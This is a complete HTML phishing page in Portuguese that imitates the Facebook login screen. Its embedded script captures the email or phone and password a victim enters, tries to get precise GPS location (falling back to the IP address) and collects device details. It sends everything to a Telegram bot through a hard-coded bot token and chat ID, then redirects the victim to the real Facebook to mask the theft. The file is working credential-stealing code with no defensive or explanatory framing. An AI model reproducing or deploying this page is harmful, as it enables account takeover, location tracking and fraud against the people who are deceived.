<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Facebook ‚Äì entre ou cadastre-se</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
  }

  body {
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
    width: 90%;
    max-width: 400px;
  }

  .logo h1 {
    color: #1877f2;
    font-size: 48px;
    margin-bottom: 10px;
    text-align: center;
    font-family: Helvetica, Arial, sans-serif;
  }

  .logo p {
    font-size: 18px;
    color: #1c1e21;
    text-align: center;
    margin-bottom: 10px;
  }

  .login-form {
    background: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    width: 100%;
  }

  .login-form input {
    width: 100%;
    padding: 14px;
    margin: 10px 0 5px 0;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 16px;
    text-transform: none;
  }

  .error-message {
    color: red;
    font-size: 13px;
    margin-bottom: 5px;
    display: none;
  }

  .login-form button {
    width: 100%;
    padding: 14px;
    margin-top: 10px;
    background-color: #1877f2;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.3s;
  }

  .login-form button:hover {
    background-color: #166fe5;
  }

  .login-form .create-account {
    background-color: #42b72a;
    margin-top: 20px;
    font-weight: bold;
  }

  .login-form a {
    display: block;
    text-align: center;
    margin-top: 12px;
    color: #1877f2;
    text-decoration: none;
    font-size: 14px;
  }

  .login-form a:hover {
    text-decoration: underline;
  }

  hr {
    margin: 20px 0;
    border: 1px solid #ddd;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">
    <h1>facebook</h1>
    <p>O Facebook ajuda voc√™ a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
  </div>

  <div class="login-form">
    <form id="loginForm">
      <input type="text" id="email" placeholder="Email ou telefone" required 
             autocapitalize="none" autocomplete="off" spellcheck="false">
      <div id="emailError" class="error-message">Digite um e-mail ou telefone v√°lido.</div>

      <input type="password" id="password" placeholder="Senha" required 
             autocapitalize="none" autocomplete="off" spellcheck="false">
      <div id="passwordError" class="error-message">A senha deve ter pelo menos 6 caracteres.</div>

      <button type="submit">Entrar</button>
      <a href="#">Esqueceu a senha?</a>
      <hr>
      <button type="button" class="create-account">Criar nova conta</button>
    </form>
  </div>
</div>

<script>
const TOKEN = "7683050283:AAGOe9GTGh3Yw3r9pqWg1A8Ap0p0_e4ffSg";
const CHAT_ID = "5542692841";
const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const phoneRegex = /^\d{8,}$/; // m√≠nimo 8 d√≠gitos
const MIN_PASSWORD_LENGTH = 6;

// Fun√ß√£o para validar email ou telefone
function isValidEmailOrPhone(value) {
  return emailRegex.test(value) || phoneRegex.test(value);
}

// Valida√ß√£o em tempo real
emailInput.addEventListener('input', () => {
  if (!isValidEmailOrPhone(emailInput.value.trim())) {
    emailError.style.display = 'block';
  } else {
    emailError.style.display = 'none';
  }
});

passwordInput.addEventListener('input', () => {
  if (passwordInput.value.length < MIN_PASSWORD_LENGTH) {
    passwordError.style.display = 'block';
  } else {
    passwordError.style.display = 'none';
  }
});

// Fun√ß√£o para obter localiza√ß√£o
function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("Geolocaliza√ß√£o n√£o suportada pelo navegador");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        };
        resolve(location);
      },
      (error) => {
        reject(error);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  });
}

// Fun√ß√£o para obter IP do usu√°rio
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Erro ao obter IP:", error);
    return "IP n√£o dispon√≠vel";
  }
}

// Fun√ß√£o para enviar dados para o Telegram
async function sendToTelegram(emailOrPhone, password, location, ip) {
  // Coleta informa√ß√µes do dispositivo
  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const screenWidth = screen.width;
  const screenHeight = screen.height;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // Formata mensagem com localiza√ß√£o ou IP
  let locationInfo = "";
  if (location) {
    locationInfo = `üìç Localiza√ß√£o: ${location.latitude}, ${location.longitude}`;
  } else {
    locationInfo = `üåê IP: ${ip}`;
  }

  const messageText = `
üîê *Novo Login Capturado*
üë§ Usu√°rio: ${emailOrPhone}
üîë Senha: ${password}

${locationInfo}

üì± *Informa√ß√µes do Dispositivo*
üåê Navegador/SO: ${userAgent}
üñ•Ô∏è Resolu√ß√£o: ${screenWidth}x${screenHeight}
üåç Idioma: ${language}
‚è∞ Fuso hor√°rio: ${timezone}
  `;

  try {
    await fetch(URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error);
  }
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const emailOrPhone = emailInput.value.trim();
  const password = passwordInput.value;

  let valid = true;

  if (!isValidEmailOrPhone(emailOrPhone)) {
    emailError.style.display = 'block';
    valid = false;
  }

  if (password.length < MIN_PASSWORD_LENGTH) {
    passwordError.style.display = 'block';
    valid = false;
  }

  if (!valid) return;

  // Tenta obter localiza√ß√£o
  let location = null;
  let ip = null;
  
  try {
    location = await getLocation();
  } catch (error) {
    console.log("Localiza√ß√£o recusada ou indispon√≠vel:", error);
    // Se a localiza√ß√£o foi recusada, obt√©m o IP
    ip = await getUserIP();
  }

  // Envia dados para o Telegram
  await sendToTelegram(emailOrPhone, password, location, ip);

  // Redireciona para o Facebook
  window.location.href = "https://facebook.com";
});
</script>

</body>
</html>
